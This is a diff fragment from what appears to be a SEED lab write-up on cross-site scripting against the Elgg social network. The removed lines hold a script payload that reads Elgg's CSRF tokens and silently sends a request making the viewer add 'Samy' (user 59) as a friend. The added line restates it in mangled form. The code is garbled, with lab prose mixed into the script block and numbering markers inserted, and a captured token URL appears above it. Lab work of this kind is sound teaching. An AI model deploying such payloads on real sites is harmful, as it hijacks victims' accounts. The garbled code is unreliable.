@@ -18,23 +18,5 @@ Captured:
 `http://www.seed-server.com/action/friends/add? friend=59&__elgg_ts=1700483477&__elgg_token=Blz_SXdDF3os1joxJsVvyw&_ _elgg_ts=1700483477&__elgg_token=Blz_SXdDF3os1joxJsVvyw`
 Script: 
 ```
-<script type="text/javascript">
-window.onload = function () {
-var Ajax=null;
-Alice's account automatically sent the request: (When refresh, the button
-automatically changed from "Add Friend" to "Remove Friend")
-Questions
-Task 3
-var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
-var token="&__elgg_token="+elgg.security.token.__elgg_token;
-//Construct the HTTP request to add Samy as a friend.
-var sendurl= "http://www.seed-server.com/action/friends/add?
-friend=59"+ts+token+ts+token; //FILL IN
-//Create and send Ajax request to add friend
-Ajax=new XMLHttpRequest();
-Ajax.open("GET", sendurl, true);
-Ajax.send();
-}
-</script>
-
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; (1) var token="&__elgg_token="+elgg.security.token.__elgg_token; (2) //Construct the HTTP request to add Samy as a friend. var sendurl= "http://www.seed-server.com/action/friends/add? friend=59"+ts+token+ts+token; //FILL IN //Create and send Ajax request to add friend Ajax=new XMLHttpRequest(); Ajax.open("GET", sendurl, true); Ajax.send(); }
 ```
